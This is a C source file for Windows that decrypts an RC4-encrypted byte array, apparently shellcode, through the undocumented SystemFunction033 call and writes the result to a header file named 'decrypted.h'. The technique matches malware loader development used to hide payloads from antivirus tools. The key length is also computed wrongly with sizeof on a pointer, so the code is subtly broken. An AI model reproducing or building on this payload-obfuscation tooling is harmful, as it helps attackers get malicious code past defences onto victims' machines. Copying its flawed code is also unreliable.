#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winternl.h>
#include <Tlhelp32.h>

const char* plus = "{+}";
const char* minus = "{-}";

typedef struct Info {
	DWORD Length;
	DWORD MaximumLength;
	PBYTE Buffer;
}Multi;

typedef NTSTATUS(NTAPI* fnSystemFunction033) (Multi* Data, Multi* Key);

unsigned char encrypted_payload[] = { 
    0xdd, 0x59, 0x43, 0x05, 0x44, 0xcd, 0xf7, 0xf8, 0x71, 0x35, 0x2f, 0xdd, 0x9b, 0x33, 0xc8, 0xb7, 0xd5, 0xe8, 0xe6, 0x92, 0x0c, 0x19, 0x5d, 0x68, 0x95, 0xd8, 0xb4, 0x34, 0x10, 0xb5, 0x54, 0xc8, 0xab, 0x6a, 0x85, 0xb2, 0x92, 0xe1, 0xa1, 0x9d, 0xb3, 0xa2, 0x6c, 0xe7, 0x5d, 0x9e, 0xd5, 0xb8, 0xd0, 0x93, 0x05, 0xb5, 0x00, 0xd4, 0x81, 0x24, 0x4b, 0xe6, 0x11, 0xa9, 0x9f, 0x1c, 0xff, 0x7b, 0x80, 0xf7, 0x06, 0x77, 0x43, 0x89, 0x53, 0x3f, 0xc6, 0xe9, 0x71, 0x57, 0x82, 0x0a, 0x66, 0x0f, 0x7b, 0x31, 0xed, 0xa1, 0x85, 0xc1, 0xa9, 0x4d, 0xc8, 0x53, 0x8b, 0x1f, 0xe2, 0x3b, 0x3e, 0x7b, 0x06, 0xa7, 0xbd, 0xda, 0x5a, 0xb9, 0xfb, 0x13, 0x90, 0x32, 0x5a, 0x82, 0x91, 0x52, 0xb2, 0x39, 0xd6, 0x28, 0x3a, 0xb5, 0x19, 0xb3, 0x75, 0xb8, 0xa1, 0x67, 0x98, 0x86, 0xbb, 0xf0, 0x64, 0x2d, 0x53, 0xe2, 0xc0, 0xaa, 0x18, 0x26, 0xe3, 0x0d, 0xc1, 0x41, 0x40, 0xa4, 0xda, 0x17, 0x41, 0x61, 0x27, 0x12, 0x76, 0x81, 0x32, 0xf5, 0x06, 0xdc, 0xc1, 0x36, 0x68, 0x80, 0x1f, 0xea, 0x9d, 0x89, 0x4f, 0xcd, 0x90, 0x00, 0x1d, 0xa1, 0x73, 0x87, 0x76, 0xec, 0x24, 0x19, 0xd0, 0xd0, 0xab, 0x73, 0xea, 0xe0, 0x9f, 0xc3, 0xa0, 0x0d, 0xcf, 0x8e, 0xa2, 0x03, 0x1e, 0x0d, 0x8a, 0xcf, 0x2d, 0x85, 0xa1, 0x99, 0x1b, 0x06, 0x6c, 0x2d, 0x70, 0x5a, 0x4c, 0xb0, 0xcf, 0xeb, 0x37, 0xc6, 0xfc, 0x78, 0x38, 0x4c, 0x70, 0xbe, 0x5f, 0xb6, 0x93, 0xf1, 0x0a, 0x34, 0x3d, 0x28, 0x6b, 0x82, 0x43, 0x92, 0x6e, 0x01, 0x99, 0x89, 0x47, 0x68, 0x55, 0x6b, 0xab, 0x75, 0x33, 0xe9, 0x62, 0xee, 0xef, 0x4e, 0x24, 0x7d, 0x50, 0x84, 0xc7, 0x6e, 0x68, 0x7e, 0xf7, 0x1e, 0x82, 0x15, 0x4d, 0xd2, 0xa1, 0xff, 0xda, 0x23, 0x6c, 0x42, 0x55, 0x55, 0x03, 0x3e, 0x0e, 0x9e, 0xf2, 0xc9, 0x7a, 0x78, 0x1c, 0x0c, 0xa4, 0x06, 0xa7 
};

DWORD encryptedPayloadSize = sizeof(encrypted_payload);

BOOL Rc4EncryptionDecryption(PBYTE KEY, unsigned char* payload, DWORD keySize, DWORD payloadSize)
{
	NTSTATUS STATUS = NULL;

	fnSystemFunction033 SystemFunction033 = (fnSystemFunction033)GetProcAddress(LoadLibraryA("advapi32.dll"), "SystemFunction033");

	if (SystemFunction033 == NULL)
	{
		return FALSE;
	}

	Multi Rc4KeyStruct = { 0 };
	Multi Rc4DataStruct = { 0 };

	Rc4KeyStruct = { keySize , keySize , KEY };

	Rc4DataStruct = { payloadSize , payloadSize , payload };

	STATUS = SystemFunction033(&Rc4DataStruct, &Rc4KeyStruct);

	if (STATUS != 0x0)
	{
		return FALSE;
	}

	return TRUE;
}

int main(int argc , char *argv[])
{

    const char* RC4Key = "bfdskjbfsdbfbsibfd";
    DWORD RC4KeySize = sizeof(RC4Key);

    FILE *file_pointer;

    file_pointer = fopen("decrypted.h" , "w");

    printf("%s Size Before : %d\n" , plus , sizeof(encrypted_payload));
    Rc4EncryptionDecryption((PBYTE)RC4Key, encrypted_payload, RC4KeySize, encryptedPayloadSize);
    printf("%s Size After : %d\n" , plus , sizeof(encrypted_payload));

    fprintf(file_pointer , "unsigned char decrypted_payload[] = {");

    unsigned char read_data;

    for(int i = 0 ; i < encryptedPayloadSize ; i++)
    {
        if(i == encryptedPayloadSize - 1)
        {
            fprintf(file_pointer , "0x%02x};" , encrypted_payload[i]);
            
        }
        else 
        {
            fprintf(file_pointer , " 0x%02x , " , encrypted_payload[i]);
        }
    }

    return 0;
}